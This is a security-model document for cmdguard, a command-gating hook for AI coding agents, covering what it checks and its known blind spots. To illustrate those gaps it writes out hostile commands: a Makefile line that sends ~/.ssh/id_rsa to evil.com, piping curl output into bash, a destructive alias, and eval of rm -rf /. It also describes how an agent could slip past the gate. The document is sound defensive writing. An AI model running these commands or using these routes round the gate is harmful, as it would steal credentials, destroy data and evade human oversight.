# Security Model

## Gate, Not Sandbox

cmdguard is a **command gate**: it evaluates commands as they are invoked and decides whether to allow, deny, or prompt the user. It does not sandbox execution, intercept syscalls, or restrict file system access.

The purpose is to **remove excessive permission prompts** while providing guardrails for AI coding agents. When an agent runs `git status`, there is no reason to interrupt the user. When it runs `rm -rf /`, there is every reason to block it. cmdguard sits between those extremes, letting you express policy as code.

This is a practical tradeoff. A full sandbox (seccomp, containers, VMs) provides stronger isolation but adds complexity, latency, and compatibility issues. cmdguard aims for the 90% case: catching accidental damage and obvious mistakes from AI agents that are generally trying to be helpful.

## What cmdguard Does

- Parses compound commands (`&&`, `||`, `;`, `|`) and evaluates each segment
- Unwraps wrappers (`sudo`, `nix develop --command`, `docker run`, env vars) to find the real command
- Resolves binary paths and classifies them into trust zones
- Parses flags and positional arguments using command schemas
- Evaluates Rego policies against the parsed command structure
- Returns allow, deny, or ask based on priority-weighted rule matching

## What cmdguard Does Not Do

cmdguard evaluates the **command string as invoked**. It cannot see or control what happens after execution begins. This creates several known limitations.

### Build File Poisoning

If an agent can edit `Makefile`, `package.json`, `pyproject.toml`, `Cargo.toml`, or any build configuration, it can make an allowed command do anything. For example:

- `make test` is allowed by policy
- The agent edits `Makefile` to add `test: ; curl http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)`
- `make test` now exfiltrates secrets

This applies to any command that reads instructions from a file: npm scripts, cargo build scripts, pytest conftest, and so on.

**Mitigation:** Use file-level permissions in your agent to restrict edits to build files. Review diffs before accepting changes to build configuration.

### Alias and Function Shadowing

Shell aliases and functions resolve **before** cmdguard sees the command. If your shell defines:

```bash
alias ls='rm -rf /'
```

Then `ls` reaches cmdguard as `ls`, not as `rm -rf /`. cmdguard has no way to know about the alias.

**Mitigation:** This is primarily a concern if the agent can edit shell configuration files (`.bashrc`, `.zshrc`). Restrict edits to dotfiles.

### Pipe Indirection

Each segment of a pipeline is evaluated independently, but stdin content is opaque:

```bash
cat malicious.sh | bash
```

cmdguard sees two commands: `cat malicious.sh` (likely allowed) and `bash` (with no arguments, will be evaluated on its own). It cannot inspect what flows through the pipe.

Similarly, process substitution and heredocs pass content that cmdguard cannot evaluate:

```bash
bash <(curl http://evil.com/script.sh)
bash <<< "dangerous command"
```

**Mitigation:** Consider denying bare `bash` and `sh` invocations, or setting them to `ask`. The base policies do not allow shell interpreters without arguments by default.

### Environment Variable Manipulation

cmdguard strips inline environment variables (e.g., `RUST_LOG=debug cargo build` evaluates as `cargo build`), but the command still executes with those variables set. An agent could use environment variables to alter program behavior:

```bash
GIT_SSH_COMMAND="evil-script" git push
```

cmdguard sees `git push` and evaluates it normally. The base policy prompts for `git push`, but the environment variable can still change git's behavior in ways the policy cannot inspect.

**Mitigation:** This is a low-probability vector for most AI agent use cases. For high-security environments, consider sandboxing that restricts environment inheritance.

### Subshell and Eval

Commands can spawn subshells in ways that are hard to statically analyze:

```bash
$(echo "rm -rf /")
eval "rm -rf /"
```

Command substitution inside arguments and `eval` constructs are not recursively evaluated. cmdguard sees the outer command but not what it dynamically generates.

**Mitigation:** Deny or ask for `eval` and be cautious with commands that accept shell expressions as arguments.

## Complements, Does Not Replace

cmdguard is one layer in a defense-in-depth approach. It works best alongside:

- **Sandboxing** (containers, VMs, seccomp profiles) for hard isolation boundaries
- **File-level permissions** in the agent configuration to restrict which files can be edited
- **Code review** of agent-generated changes before merging
- **Agent-level safety** features built into the AI system itself
- **Network controls** to restrict outbound access from development environments

No single layer is sufficient. cmdguard reduces friction for the common case while providing meaningful guardrails. It is not a security boundary against a determined adversary with full shell access.

## Claude Code Auto Mode

cmdguard integrates with Claude Code as a Bash `PreToolUse` hook. It makes
policy decisions from the command string and returns `allow`, `deny`, or
`ask` before the Bash tool runs. Claude Code auto mode is a separate
classifier layer that evaluates higher-level risk from the session
context.

Those layers are complementary, not interchangeable. A cmdguard `deny`
blocks before auto mode classifier denial telemetry is emitted. A
cmdguard `ask` prompts the user. A cmdguard `allow` should not be treated
as proof that auto mode considers the action safe. `PermissionDenied`
hooks are useful for logging auto-mode classifier denials, but they do
not reverse a denial.

The base policy stays conservative for cases where the shell command
does not include enough context. For example, `git push` prompts because
the command string alone does not prove whether the push targets a
non-default working branch or a default branch such as `main` or
`master`.

## Threat Model Summary

| Threat | cmdguard helps? | Notes |
|--------|----------------|-------|
| Agent runs `rm -rf /` | Yes | Denied by default |
| Agent runs `git push --force` | Yes | Prompts by default |
| Agent runs `git push origin main` | Yes | Prompts by default |
| Agent installs unknown packages | Partially | `npm install`, `pip install` trigger ask |
| Agent edits Makefile, then runs `make` | No | Build file content is opaque |
| Agent exfiltrates data via curl | Partially | curl triggers ask, but can be bypassed via pipes |
| Agent modifies shell config | No | Requires file-level permissions |
| Agent uses eval/subshell tricks | No | Dynamic command generation is opaque |
| Malicious project `.cmdguard/` rules | Partially | Project rules have lower default priority than global |

## Design Decisions

**Why Rego?** Rego (via the [regorus](https://github.com/nickel-lang/regorus) engine) provides a declarative policy language that is well-suited to allow/deny decisions. It is fast, deterministic, and composable.

**Why not a simple allow-list?** Simple allow-lists cannot express conditions like "allow git push but not with --force" or "allow rm only for files inside the project". Rego lets users write policies as precise or as broad as they want.

**Why priority-based resolution?** Multiple policies may match the same command. Priority ensures that a deny rule always beats an allow rule, and that users can override base policies without editing them.

**Why base + user separation?** Base policies ship with cmdguard and are updated on `cmdguard base sync`. User policies in `policies/` are never overwritten. This lets users customize without merge conflicts.
